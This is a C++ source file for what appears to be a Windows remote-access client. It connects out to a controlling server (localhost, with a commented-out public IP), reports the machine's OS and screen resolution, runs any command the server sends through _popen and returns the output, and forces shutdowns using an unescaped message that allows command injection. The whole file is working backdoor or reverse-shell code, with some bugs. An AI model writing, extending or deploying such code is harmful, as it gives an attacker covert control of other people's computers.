#include <iostream>
#include <winsock2.h>
#include <stdio.h>
#include <process.h>
#include <sstream>
#include <rapidjson/document.h>		
#include <rapidjson/prettywriter.h>
#include <rapidjson/filestream.h>	
#include <rapidjson/stringbuffer.h>
#include "osdetect.h"
#include "resdetect.h"
#pragma comment(lib,"ws2_32.lib")

using namespace rapidjson;

// If connection is lost try to reconnect to host
void retry(void* sock) {
	SOCKET Socket = (SOCKET)sock;
	char buffer[1000];
	memset(buffer,0,999);
	//cout << "Lost connection" << endl;
}

// Receive data from host
void recv(void* sock) {
	SOCKET Socket = (SOCKET)sock;
	char buffer[1000];
	memset(buffer,0,999);
	
	while(1) {
    int inDataLength=recv(Socket,buffer,1000,0);
	if(inDataLength < 0) {
		// Try and reconnect
		//retry((void*)Socket);
		//break;
	}
	if(inDataLength == 0) continue;

	// Parse JSON request
	Document document;
	if (document.Parse<0>(buffer).HasParseError()) {
		system("PAUSE");
	}

	if(strcmp(document["req"].GetString(), "details") == 0) {
		// Get operating system
		string OS = osdetect();

		// Get screen resolution
		int horizontal = 0;
		int vertical = 0;
		GetDesktopResolution(horizontal, vertical);
		stringstream hor;
		stringstream vert;
		hor << horizontal;
		vert << vertical;
		string resolution = hor.str()+"x"+vert.str();

		// Create JSON
		StringBuffer s;
		Writer<StringBuffer> writer(s);
		writer.StartObject();
		writer.String("res");
		writer.String("details");
		writer.String("os");
		writer.StartObject();
		writer.String("name");
		writer.String(OS.c_str());
		writer.String("resolution");
		writer.String(resolution.c_str());
		writer.EndObject();
		writer.EndObject();

		// Send JSON to host
		const char *szMessage = s.GetString();
		send(Socket,szMessage,strlen(szMessage),0);
	}
	// Command Execution
	else if(strcmp(document["req"].GetString(), "execute") == 0) {
		char *cmdOutput = "";
            FILE* pipe = _popen(document["cmd"].GetString(), "r");
            if(pipe) {
                char cmdBuffer[1024];
                std::string result = "";
                while(!feof(pipe)) {
                    if(fgets(cmdBuffer, 1024, pipe) != NULL)
                        result += cmdBuffer;
                }
                _pclose(pipe);
                cmdOutput = cmdBuffer;
            } else {
                cmdOutput = "Error, could not open pipe.";
            }
            
			// Create JSON response
            rapidjson::StringBuffer s;
            rapidjson::Writer<rapidjson::StringBuffer> writer(s);
            writer.StartObject();
            writer.String("res");
            writer.String("execute");
            writer.String("cmd");
            writer.String(cmdOutput);
            writer.EndObject();

			// Send JSON response
            const char *jsonReply = s.GetString();
            send(Socket, jsonReply, strlen(jsonReply), 0);
	} else if(strcmp(document["req"].GetString(), "shutdown") == 0){
		char *cmdOutput = "";
		char sprint[1024];
		stringstream command_exec;
		sprintf(sprint,"shutdown -c '%s' -s -f", document["msg"].GetString());
            FILE* pipe = _popen(sprint, "r");
            if(pipe) {
                char cmdBuffer[1024];
                std::string result = "";
                while(!feof(pipe)) {
                    if(fgets(cmdBuffer, 1024, pipe) != NULL)
                        result += cmdBuffer;
                }
                _pclose(pipe);
                cmdOutput = cmdBuffer;
            } else {
                cmdOutput = "Error, could not open pipe.";
            }

			if(cmdOutput == "") {
				cmdOutput = "Shutdown initiated";
			}
            
			// Create JSON response
            rapidjson::StringBuffer s;
            rapidjson::Writer<rapidjson::StringBuffer> writer(s);
            writer.StartObject();
            writer.String("res");
            writer.String("shutdown");
            writer.String("out");
            writer.String(cmdOutput);
            writer.EndObject();

			// Send JSON response
            const char *jsonReply = s.GetString();
            send(Socket, jsonReply, strlen(jsonReply), 0);
	} 

	}

}

int main() {

	// Start WinSock2
	WSADATA WsaDat;
	if(WSAStartup(MAKEWORD(2,2),&WsaDat)!=0){
		cout<<"Winsock error - Winsock initialization failed\r\n";
		WSACleanup();
		system("PAUSE");
		return 0;
	}
	
	// Define socket protocols
	SOCKET Socket=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);
	if(Socket==INVALID_SOCKET){
		cout<<"Winsock error - Socket creation Failed!\r\n";
		WSACleanup();
		system("PAUSE");
		return 0;
	}

	SOCKADDR_IN SockAddr;
	// Start on port 55555 and on local
	SockAddr.sin_port=htons(55555);
	SockAddr.sin_family=AF_INET;
	SockAddr.sin_addr.s_addr= inet_addr("127.0.0.1"); //173.26.251.247

	// Connect to host
	if(connect(Socket,(SOCKADDR*)(&SockAddr),sizeof(SockAddr))!=0){
		cout<<"Failed to establish connection with server\r\n";
		WSACleanup();
		system("PAUSE");
		return 0;
	}

	// Start communication thread
	recv((void*)Socket);
	
}